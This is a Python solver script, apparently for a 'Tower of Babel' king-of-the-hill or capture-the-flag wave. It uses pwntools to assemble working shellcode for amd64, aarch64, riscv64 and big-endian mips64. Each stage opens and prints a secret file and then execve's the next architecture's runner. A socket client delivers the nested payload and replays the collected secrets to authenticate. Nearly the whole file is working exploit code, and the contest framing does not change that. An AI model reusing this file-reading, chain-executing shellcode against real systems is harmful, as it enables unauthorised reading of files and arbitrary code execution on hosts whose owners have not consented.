#!/usr/bin/env python3
"""Solve one Tower of Babel wave with a nested four-architecture relay."""

from __future__ import annotations

import argparse
import os
import socket
import subprocess
import tempfile
from typing import Optional

from pwn import asm, context


STACK_FRAME = 0x2000
SECRET_BUF = 0
HEX_BUF = 0x100
SECRET_SIZE = 0x100
MAX_PAYLOAD = 32 * 1024

SYS = {
    "amd64": (257, 0, 1, 3, 59, 60),
    "aarch64": (56, 63, 64, 57, 221, 93),
    "riscv64": (56, 63, 64, 57, 221, 93),
    "mips64be": (5002, 5000, 5001, 5003, 5057, 5058),
}


def _bytes(blob: bytes) -> str:
    return ",".join(str(byte) for byte in blob) or "0"


def _rv64(src: str) -> bytes:
    with tempfile.TemporaryDirectory(prefix="babel-rv64-") as directory:
        source = os.path.join(directory, "stage.S")
        obj = os.path.join(directory, "stage.o")
        elf = os.path.join(directory, "stage.elf")
        raw = os.path.join(directory, "stage.bin")
        with open(source, "w", encoding="utf-8") as handle:
            handle.write(src)
        subprocess.run(["riscv64-linux-gnu-as", "-march=rv64gc", "-mabi=lp64", "-mno-relax", "-o", obj, source], check=True)
        subprocess.run(["riscv64-linux-gnu-ld", "--no-relax", "-Ttext=0", "-e", "_start", "-o", elf, obj], check=True)
        subprocess.run(["riscv64-linux-gnu-objcopy", "-O", "binary", elf, raw], check=True)
        with open(raw, "rb") as handle:
            return handle.read()


def _amd64(secret: str, next_runner: Optional[str], next_blob: bytes) -> bytes:
    openat, read, write, close, execve, exit_ = SYS["amd64"]
    tail = "" if next_runner is None else f"""
    lea rsi, [rip + next_stage]
    mov rcx, {len(next_blob)}
    lea r12, [rsp + {HEX_BUF}]
    mov rdi, r12
    lea r8, [rip + hextab]
hex_loop:
    test rcx, rcx
    jz hex_done
    movzx eax, byte ptr [rsi]
    mov edx, eax
    shr eax, 4
    and edx, 15
    mov al, byte ptr [r8 + rax]
    mov dl, byte ptr [r8 + rdx]
    mov byte ptr [rdi], al
    mov byte ptr [rdi + 1], dl
    add rdi, 2
    inc rsi
    dec rcx
    jmp hex_loop
hex_done:
    mov byte ptr [rdi], 0
    xor eax, eax
    push rax
    push r12
    lea rdi, [rip + next_exec]
    push rdi
    mov rsi, rsp
    xor edx, edx
    mov eax, {execve}
    syscall
    mov eax, {exit_}
    mov edi, 1
    syscall
"""
    return asm(f"""
.intel_syntax noprefix
    mov eax, {openat}
    mov edi, -100
    lea rsi, [rip + secret]
    xor edx, edx
    xor r10d, r10d
    syscall
    mov r12d, eax
    sub rsp, {STACK_FRAME}
    mov edi, r12d
    lea rsi, [rsp + {SECRET_BUF}]
    mov edx, {SECRET_SIZE}
    xor eax, eax
    syscall
    mov r13d, eax
    mov eax, {write}
    mov edi, 1
    lea rsi, [rsp + {SECRET_BUF}]
    mov edx, r13d
    syscall
    mov eax, {close}
    mov edi, r12d
    syscall
{tail}
    mov eax, {exit_}
    xor edi, edi
    syscall
secret: .asciz "{secret}"
next_exec: .asciz "{next_runner or ''}"
hextab: .ascii "0123456789abcdef"
next_stage: .byte {_bytes(next_blob)}
""", arch="amd64")


def _aarch64(secret: str, next_runner: Optional[str], next_blob: bytes) -> bytes:
    _, read, write, close, execve, exit_ = SYS["aarch64"]
    tail = "" if next_runner is None else f"""
    adr x21, next_stage
    mov x22, #{len(next_blob)}
    add x23, sp, #{HEX_BUF}
    mov x24, x23
    adr x25, hextab
1:
    cbz x22, 2f
    ldrb w0, [x21], #1
    lsr w1, w0, #4
    and w2, w0, #15
    ldrb w1, [x25, x1]
    strb w1, [x23], #1
    ldrb w2, [x25, x2]
    strb w2, [x23], #1
    sub x22, x22, #1
    b 1b
2:
    strb wzr, [x23]
    sub sp, sp, #0x30
    adr x0, next_exec
    str x0, [sp]
    str x24, [sp, #8]
    str xzr, [sp, #16]
    adr x0, next_exec
    mov x1, sp
    mov x2, xzr
    mov x8, #{execve}
    svc #0
    mov x0, #1
    mov x8, #{exit_}
    svc #0
"""
    return asm(f"""
    mov x0, #-100
    adr x1, secret
    mov x2, #0
    mov x3, #0
    mov x8, #56
    svc #0
    mov x19, x0
    sub sp, sp, #{STACK_FRAME}
    mov x0, x19
    add x1, sp, #{SECRET_BUF}
    mov x2, #{SECRET_SIZE}
    mov x8, #{read}
    svc #0
    mov x20, x0
    mov x0, #1
    add x1, sp, #{SECRET_BUF}
    mov x2, x20
    mov x8, #{write}
    svc #0
    mov x0, x19
    mov x8, #{close}
    svc #0
{tail}
    mov x0, #0
    mov x8, #{exit_}
    svc #0
secret: .asciz "{secret}"
next_exec: .asciz "{next_runner or ''}"
hextab: .ascii "0123456789abcdef"
.balign 4
next_stage: .byte {_bytes(next_blob)}
""", arch="aarch64")


def _riscv64(secret: str, next_runner: Optional[str], next_blob: bytes) -> bytes:
    _, read, write, close, execve, exit_ = SYS["riscv64"]
    tail = "" if next_runner is None else f"""
    la t0, next_stage
    li t1, {len(next_blob)}
    addi t2, sp, {HEX_BUF}
    mv s2, t2
    la t6, hextab
1:
    beqz t1, 2f
    lbu t3, 0(t0)
    addi t0, t0, 1
    srli t4, t3, 4
    andi t5, t3, 15
    add a0, t6, t4
    lbu a0, 0(a0)
    sb a0, 0(t2)
    add a0, t6, t5
    lbu a0, 0(a0)
    sb a0, 1(t2)
    addi t2, t2, 2
    addi t1, t1, -1
    j 1b
2:
    sb zero, 0(t2)
    addi sp, sp, -32
    la a0, next_exec
    sd a0, 0(sp)
    sd s2, 8(sp)
    sd zero, 16(sp)
    la a0, next_exec
    mv a1, sp
    li a2, 0
    li a7, {execve}
    ecall
    li a0, 1
    li a7, {exit_}
    ecall
"""
    return _rv64(f"""
.option norelax
.text
.globl _start
_start:
    li a0, -100
    la a1, secret
    li a2, 0
    li a3, 0
    li a7, 56
    ecall
    mv s0, a0
    li t0, -{STACK_FRAME}
    add sp, sp, t0
    mv a0, s0
    addi a1, sp, {SECRET_BUF}
    li a2, {SECRET_SIZE}
    li a7, {read}
    ecall
    mv s1, a0
    li a0, 1
    addi a1, sp, {SECRET_BUF}
    mv a2, s1
    li a7, {write}
    ecall
    mv a0, s0
    li a7, {close}
    ecall
{tail}
    li a0, 0
    li a7, {exit_}
    ecall
secret: .asciz "{secret}"
next_exec: .asciz "{next_runner or ''}"
hextab: .ascii "0123456789abcdef"
.balign 4
next_stage: .byte {_bytes(next_blob)}
""")


def _mips64be(secret: str, next_runner: Optional[str], next_blob: bytes) -> bytes:
    _, read, write, close, execve, exit_ = SYS["mips64be"]
    tail = "" if next_runner is None else f"""
    dli $t9, next_stage - got_pc
    daddu $t0, $s7, $t9
    dli $t1, {len(next_blob)}
    daddiu $t2, $sp, {HEX_BUF}
    move $s2, $t2
    dli $t9, hextab - got_pc
    daddu $t3, $s7, $t9
1:
    beqz $t1, 2f
    nop
    lbu $t8, 0($t0)
    daddiu $t0, $t0, 1
    dsrl $t9, $t8, 4
    daddu $a0, $t3, $t9
    lbu $a0, 0($a0)
    sb $a0, 0($t2)
    andi $t9, $t8, 15
    daddu $a0, $t3, $t9
    lbu $a0, 0($a0)
    sb $a0, 1($t2)
    daddiu $t2, $t2, 2
    daddiu $t1, $t1, -1
    b 1b
    nop
2:
    sb $zero, 0($t2)
    daddiu $sp, $sp, -32
    dli $t9, next_exec - got_pc
    daddu $a0, $s7, $t9
    sd $a0, 0($sp)
    sd $s2, 8($sp)
    sd $zero, 16($sp)
    dli $t9, next_exec - got_pc
    daddu $a0, $s7, $t9
    move $a1, $sp
    move $a2, $zero
    dli $v0, {execve}
    syscall
    dli $a0, 1
    dli $v0, {exit_}
    syscall
"""
    return asm(f"""
.set noreorder
.set mips64
    bal got_pc
    nop
got_pc:
    move $s7, $ra
    dli $t9, secret - got_pc
    daddu $a0, $s7, $t9
    dli $a1, 0
    dli $a2, 0
    dli $v0, 5002
    syscall
    move $s0, $v0
    daddiu $sp, $sp, -{STACK_FRAME}
    move $a0, $s0
    daddiu $a1, $sp, {SECRET_BUF}
    dli $a2, {SECRET_SIZE}
    dli $v0, {read}
    syscall
    move $s1, $v0
    dli $a0, 1
    daddiu $a1, $sp, {SECRET_BUF}
    move $a2, $s1
    dli $v0, {write}
    syscall
    move $a0, $s0
    dli $v0, {close}
    syscall
{tail}
    dli $a0, 0
    dli $v0, {exit_}
    syscall
secret: .asciiz "{secret}"
next_exec: .asciiz "{next_runner or ''}"
hextab: .ascii "0123456789abcdef"
.balign 4
next_stage: .byte {_bytes(next_blob)}
""", arch="mips", bits=64, endian="big")


BUILDERS = {"amd64": _amd64, "aarch64": _aarch64, "riscv64": _riscv64, "mips64be": _mips64be}


def build_chain(stages: list[dict[str, str]]) -> bytes:
    payload: bytes | None = None
    for stage in reversed(stages):
        builder = BUILDERS[stage["arch"]]
        payload = builder(stage["secretPath"], stage["nextRunner"] or None, payload or b"")
    if payload is None or len(payload) > MAX_PAYLOAD:
        raise ValueError("outer payload exceeds the wave limit")
    return payload


def readline(sock: socket.socket) -> str:
    data = bytearray()
    while len(data) <= 70 * 1024:
        byte = sock.recv(1)
        if not byte:
            raise RuntimeError("target closed before a complete line")
        data += byte
        if byte == b"\n":
            return data.decode().rstrip("\r\n")
    raise RuntimeError("target line exceeded the protocol limit")


def solve(host: str, port: int, token: str) -> str:
    with socket.create_connection((host, port), timeout=6) as sock:
        sock.settimeout(6)
        if not readline(sock).startswith("BABEL/2 ") or not readline(sock).startswith("Send "):
            raise RuntimeError("unexpected target greeting")
        sock.sendall(f"HELLO {token}\n".encode())
        if not readline(sock).startswith("WELCOME "):
            raise RuntimeError("capability was rejected")
        info_line = readline(sock)
        if not info_line.startswith("INFO "):
            raise RuntimeError("target did not return wave metadata")
        import json
        info = json.loads(info_line[5:])
        stages = info["stages"]
        if len(stages) != 4 or [stage["name"] for stage in stages] != info["order"]:
            raise RuntimeError("target returned an invalid stage roster")
        payload = build_chain(stages)
        sock.sendall(b"RELAY " + payload.hex().encode() + b"\n")
        stage_secrets: list[str] = []
        result = None
        while True:
            line = readline(sock)
            if line.startswith("STAGE "):
                stage_secrets.append(line.rsplit(" ", 1)[1])
            elif line.startswith("RELAY_RESULT "):
                result = json.loads(line[13:])
            elif line == "AUTH_REQUIRED":
                break
            elif result is not None:
                break
        if result is None or result["status"] != "complete" or result["depth"] != 4 or len(stage_secrets) != 4:
            raise RuntimeError(f"relay did not complete: {result}")
        sock.sendall(("AUTH " + "".join(stage_secrets) + "\n").encode())
        if readline(sock) != "RELAY_ACCEPTED":
            raise RuntimeError("authentication sequence was rejected")
        readline(sock)  # PATCH_WINDOW or PATCH_LOCKED
        return f"mastery depth=4 payloadBytes={len(payload)} wave={info['waveId']}"


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True, type=int)
    parser.add_argument("--token", default="koth_localtest123", help="current event capability. Local development uses the default")
    args = parser.parse_args()
    if not 1 <= args.port <= 65535:
        parser.error("--port must be in 1..65535")
    context.log_level = "error"
    try:
        print(solve(args.host, args.port, args.token))
    except (OSError, RuntimeError, ValueError, KeyError, subprocess.SubprocessError) as error:
        parser.exit(1, f"solve failed: {error}\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
